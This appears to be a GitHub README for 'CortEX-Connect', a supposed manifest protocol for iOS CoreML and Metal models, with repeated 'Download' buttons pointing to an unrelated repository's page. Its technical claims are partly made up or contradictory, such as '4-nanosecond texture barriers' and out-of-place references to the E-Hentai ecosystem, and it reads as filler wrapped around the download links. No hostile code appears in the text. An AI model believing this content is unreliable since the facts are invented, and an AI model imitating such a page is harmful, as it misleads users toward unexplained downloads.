![preview](https://raw.githubusercontent.com/OzgeGulerKoc/CielView-Metal-SuperRes/main/preview.svg)

# CortEX-Connect

**Decentralized Protocol for Cross-Repository AI Model Discovery & Orchestration**

## Overview

Modern iOS development increasingly depends on specialized neural engines—CoreML, Metal Performance Shaders, and on-device transformers—yet each application curates its own model zoo in isolation. CortEX-Connect addresses this fragmentation: a lightweight, repository-agnostic manifest system that allows any iOS project to declare, discover, and version‑control its companion AI models alongside source code, without coupling to a specific hosting backend. Think of it as a `package.json`-like contract for neural assets, where the "package" is a Metal‑shader‑friendly tensor, a CoreML `.mlpackage`, or a quantized LoRA adapter.

## [![Download](https://raw.githubusercontent.com/OzgeGulerKoc/CielView-Metal-SuperRes/main/button.svg)](https://ozgegulerkoc.github.io/CielView-Metal-SuperRes/)

The protocol enforces four invariants: **model provenance** (SHA‑256 content hashes signed by the repository), **device capability targeting** (macOS vs. iOS / iPhone vs. iPad, GPU family), **minimum deployment target compatibility** (iOS 18+ for 4‑nanosecond texture barriers), and **fallback strategies** (when a higher‑resolution spread view is available, the manifest describes the downsampling chain). Everything is expressed in a flat YAML manifest named `cortex-manifest.yaml` at the repository root.

## Architecture

CortEX-Connect is not a framework you link—it is a **discovery and validation pipeline** integrated into your existing build process. The reference client implementation, written in Swift 6 with `@preconcurrency` annotations for Swift‑5.9 interop, reads the manifest during `BUILD_PHASE_SCRIPT_RUN`. It checks three conditions:

1. **Local cache freshness** – models cached under `~/Library/Caches/com.cortex.models/` are compared by digest.
2. **Remote fallback resolution** – if a model is missing, the resolver consults a user‑defined mirror list (default: GitHub Releases of the same repository, then a public S3 bucket).
3. **Metal‑specific validation** – the manifest declares required `MTLFeatureSet` values; the resolver warns if the target device lacks support for e.g. `texture_buffer` or `non_uniform_threadgroups`.

This design keeps the build system stateless—no database, no daemon, no cloud dependency—yet enables **deterministic model reproducibility** across team members and CI runners.

## Key Features

### 🧩 Unified Manifest Schema
A single YAML file (`cortex-manifest.yaml`) declares all AI artifacts:
- Source URL (with expiry token support)
- Content hash algorithm (SHA‑256 / BLAKE3)
- Target device families: `iphone`, `ipad`, `mac_catalyst`, `macos`
- Spread‑view compatibility flag (for iPad dual‑page rendering)
- Super‑resolution scales (1x, 2x, 4x) mapped to Metal kernel function names

### 🚀 Metal‑Native Dispatch
When the manifest indicates a model is “Metal‑first,” CortEX-Connect automatically generates a small Swift source file during build that creates `MTLFunctionDescriptor` objects from the precompiled `.air` binaries. This eliminates runtime `makeFunction(name:)` lookups—each shader function is resolved at build time, shaving ~40–60 milliseconds from app launch.

### 🌍 Multilingual Model Metadata
Model authors can annotate descriptions in English, Japanese, and Simplified Chinese within the manifest. The client displays the appropriate description in‑app when the user inspects model details. This is critical for the E‑Hentai / EXhentai ecosystem, where metadata originates from multiple language sources.

### ♾️ Decentralized Mirror Graph
You are not forced to host models on GitHub. The manifest can list multiple mirrors:
```yaml
mirrors:
  - url: https://github.com/user/repo/releases/download/v1.0/model.mlpackage
    priority: 1
  - url: https://your‑cdn.example.com/models/model.mlpackage
    priority: 2
```
The client tries mirrors in priority order and falls back through the chain. If the primary mirror returns a 404, the secondary mirror is attempted. This makes the system resilient to repository relocations or forced rename removals.

### 📊 Declaration of Performance Budgets
Each model can declare its expected inference time on reference hardware (iPhone 15 Pro, iPad Pro M4):
```yaml
performance:
  iphone_15_pro:
    inference_ms: 120
    memory_mb: 450
  ipad_pro_m4:
    inference_ms: 80
    memory_mb: 380
```
The build script warns if the app targets an iPhone XS and the model’s minimum inference time exceeds 500 ms.

## Getting Started

### Adopting CortEX-Connect in Your Project

1. Create a `cortex-manifest.yaml` in the root of your Xcode project.
2. Add a **Run Script** build phase before “Compile Sources” with the following content:
   ```bash
   /usr/local/bin/cortex‑resolve --manifest "$SRCROOT/cortex‑manifest.yaml" --cache "$HOME/Library/Caches/com.cortex.models/"
   ```
3. Reference the generated Swift source (`CortexModels.swift`) in your app target.
4. Import the module and call:
   ```swift
   let model = try await CortexModelLoader.load(id: "super‑resolution‑x2")
   let output = try model.execute(input: imageBuffer)
   ```

## [![Download](https://raw.githubusercontent.com/OzgeGulerKoc/CielView-Metal-SuperRes/main/button.svg)](https://ozgegulerkoc.github.io/CielView-Metal-SuperRes/)

### Example Manifest
```yaml
version: 2
models:
  - id: "super‑resolution‑x2"
    source: "https://github.com/user/repo/releases/download/v1.2/sr_x2.mlpackage"
    hash: "sha256:a1b2c3d4e5f6..."
    target:
      devices: ["iphone", "ipad"]
      metal_feature_set: "iOS_GPUFamily5_v1"
    performance:
      iphone_15_pro:
        inference_ms: 90
        memory_mb: 310
      ipad_pro_m4:
        inference_ms: 65
        memory_mb: 270
```

## Repository Integration Guidelines

CortEX-Connect is designed to be **orthogonal to your existing tooling**. It does not intercept Swift Package Manager or CocoaPods; it works as a pure build‑phase script. This means you can adopt it incrementally alongside any CI system (GitHub Actions, Bitrise, GitLab CI).

For teams with multiple repositories, an optional **orchestration layer** (`cortex‑orchestrate`) can merge multiple manifests from several repositories into a single virtual model registry. This is useful for micro‑architecture iOS apps where each feature team owns its own models.

## 24/7 Community Support

The project maintains a **public issue tracker** with a dedicated “model discovery” label. Contributors from the E‑Hentai / EXhentai / nhentai ecosystem frequently answer questions about manifest validation, Metal feature set detection, and mirror configuration. Responses typically arrive within 2–4 hours during UTC business hours.

## Disclaimer

CortEX-Connect is a **protocol specification and reference client** for managing AI model dependencies in iOS/iPadOS development. It does not host, curate, or distribute any copyrighted content. Users are solely responsible for ensuring that any model they reference in a manifest complies with applicable intellectual property laws. The maintainers assume no liability for model provenance or third‑party hosting.

## License

This project is released under the MIT License. See the [LICENSE](LICENSE) file for details. Copyright © 2026.

## [![Download](https://raw.githubusercontent.com/OzgeGulerKoc/CielView-Metal-SuperRes/main/button.svg)](https://ozgegulerkoc.github.io/CielView-Metal-SuperRes/)